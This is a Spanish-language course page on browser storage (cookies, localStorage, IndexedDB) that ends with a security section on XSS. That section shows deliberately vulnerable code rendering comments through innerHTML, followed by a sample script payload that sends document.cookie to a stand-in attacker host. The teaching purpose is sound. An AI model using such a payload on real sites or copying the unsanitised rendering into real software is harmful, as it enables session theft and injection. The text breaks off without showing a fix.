# Almacenamiento en el Lado del Cliente

## Cookies

Las cookies son pequeños fragmentos de datos almacenados en el navegador del usuario. Son útiles para almacenar información persistente que debe enviarse con cada solicitud HTTP al servidor, como sesiones de usuario.

```javascript
document.cookie = "username=John Doe; expires=Thu, 18 Dec 2021 12:00:00 UTC; path=/;";
```

En este ejemplo:
1. **Creamos una cookie** llamada `username` con el valor `John Doe`.
2. **Establecemos una fecha de expiración** para la cookie.
3. **Definimos el `path`** para especificar la ruta en la que la cookie está disponible.

### Manipular Cookies

```javascript
var x = document.cookie;  // Leer todas las cookies
document.cookie = "username=John Smith; expires=Thu, 18 Dec 2021 12:00:00 UTC; path=/;";  // Modificar una cookie
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";  // Borrar una cookie
```

En este ejemplo:
1. **Leemos todas las cookies** disponibles.
2. **Modificamos la cookie `username`**.
3. **Borramos la cookie `username`** estableciendo una fecha de expiración pasada.

Para una gestión más avanzada de cookies, se recomienda utilizar las funciones proporcionadas por la W3C: [W3Schools - Cookies](https://www.w3schools.com/js/js_cookies.asp).

El servidor puede enviar cookies en las respuestas HTTP sin necesidad de intervención de JavaScript. Esta técnica es común en lenguajes como PHP para gestionar sesiones. Además, existen las cookies **HttpOnly**, un tipo especial de cookie con un nivel de seguridad más alto. Estas cookies están diseñadas para ser inaccesibles desde el lado del cliente, lo que significa que no pueden ser leídas ni modificadas mediante JavaScript u otros scripts en el navegador. Su manejo está restringido exclusivamente al servidor, lo que las hace más seguras frente a ataques como el **Cross-Site Scripting (XSS)**.

## LocalStorage

LocalStorage permite almacenar datos en el navegador de forma persistente. Los datos persisten incluso después de cerrar el navegador.

```javascript
// Guardar
localStorage.setItem("lastname", "Smith");
// Obtener
var lastname = localStorage.getItem("lastname");
// Borrar
localStorage.removeItem("lastname");
```

En este ejemplo:
1. **Guardamos un valor** con la clave `lastname` en LocalStorage.
2. **Recuperamos el valor** almacenado usando la clave `lastname`.
3. **Eliminamos el valor** asociado a la clave `lastname`.

## IndexedDB

IndexedDB es una API de bajo nivel para almacenar grandes cantidades de datos estructurados. Es una base de datos transaccional y asíncrona que permite almacenar archivos y realizar búsquedas avanzadas.

- **Hasta 50MB** de almacenamiento.
- **API asíncrona** para operaciones de lectura y escritura.
- **Transaccional** para garantizar la integridad de los datos.
- **Más compleja** que LocalStorage.

### Ejemplo Básico de IndexedDB

IndexedDB es más compleja de manejar que LocalStorage o cookies, pero ofrece muchas más capacidades. Aquí presentamos un ejemplo muy básico para ilustrar su uso:

```javascript
let request = indexedDB.open("myDatabase", 1);

request.onupgradeneeded = function(event) {
  let db = event.target.result;
  let objectStore = db.createObjectStore("customers", { keyPath: "id" });
  objectStore.createIndex("name", "name", { unique: false });
  objectStore.createIndex("email", "email", { unique: true });
};

request.onsuccess = function(event) {
  let db = event.target.result;
  let transaction = db.transaction(["customers"], "readwrite");
  let objectStore = transaction.objectStore("customers");
  let request = objectStore.add({ id: 1, name: "John Doe", email: "john.doe@example.com" });

  request.onsuccess = function(event) {
    console.log("Customer added to the database");
  };

  request.onerror = function(event) {
    console.log("Error adding customer: ", event.target.error);
  };
};
```

En este ejemplo:
1. **Abrimos una conexión a IndexedDB** y, si es la primera vez, se crea o actualiza la base de datos.
2. **Definimos un `objectStore`** para almacenar datos de clientes con un índice para `name` y `email`.
3. **Añadimos un cliente** a la base de datos dentro de una transacción y manejamos los eventos de éxito y error.

## Seguridad

Una de las mayores amenazas para localStorage y sessionStorage es el Cross-Site Scripting (XSS). En un ataque XSS, un atacante inyecta scripts maliciosos en una aplicación web, que luego pueden ejecutarse en el navegador del usuario. Si esos scripts tienen acceso a localStorage, pueden leer datos sensibles o modificar los datos almacenados.

No se debe almacenar datos sensibles, como credenciales, tokens de autenticación o información personal confidencial, en estos mecanismos de almacenamiento. Es preferible utilizar soluciones más seguras en el servidor o emplear cookies con restricciones de acceso, como HttpOnly y Secure.

Para reducir el riesgo de ataques de Cross-Site Scripting (XSS), es esencial validar y sanitizar cualquier dato antes de almacenarlo. Esto evita la ejecución de código malicioso en el navegador del usuario y protege la integridad de la información.

Si es necesario almacenar datos de manera temporal, se recomienda establecer un mecanismo de expiración para eliminarlos automáticamente después de un tiempo determinado. De este modo, se limita la exposición de la información y se refuerza la seguridad.

Con los tokens que vamos a usar en este curso es necesarios guardarlos, pero será mejor en `sessionStorage` para que se pierda al cerrar el navegador o mediante mecanismos de expiración y de sanitización.

Imaginemos un formulario como este:

```html
<form id="commentForm">
        <label for="comment">Comentario:</label><br>
        <textarea id="comment" name="comment" required></textarea><br>
        <button type="submit">Enviar</button>
    </form>
```

Y que después hacemos algo tan inocente como guardar el comentario en la base de datos y mostrarlo así:

```javascript
    const form = document.querySelector("#commentForm");
    const commentsList = document.querySelector("#commentsList");

        // Enviar comentario al servidor
    form.addEventListener("submit", async function(event) {
        event.preventDefault();
        const commentText = document.querySelector("#comment").value;
        const response = await fetch("https://jsonplaceholder.typicode.com/comments", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ body: commentText })
            });
        });

    // Recuperar comentarios desde el servidor (sin sanitización)
    async function fetchComments() {
        const response = await fetch("https://jsonplaceholder.typicode.com/comments?_limit=5");
        const comments = await response.json();

        commentsList.innerHTML = "";

        comments.forEach(comment => {
                const li = document.createElement("li");
                li.innerHTML = comment.body; // ⚠️ XSS: Usar innerHTML permite ejecutar scripts maliciosos
                commentsList.appendChild(li);
         });
        }
        // Cargar comentarios al iniciar
        fetchComments();
```

El atacante podría poner un comentario con este contenido exacto, incluidas las etiquetas:

```html
<script>
    fetch("https://malicioso.com/robar?data=" + document.cookie);
</script>
```

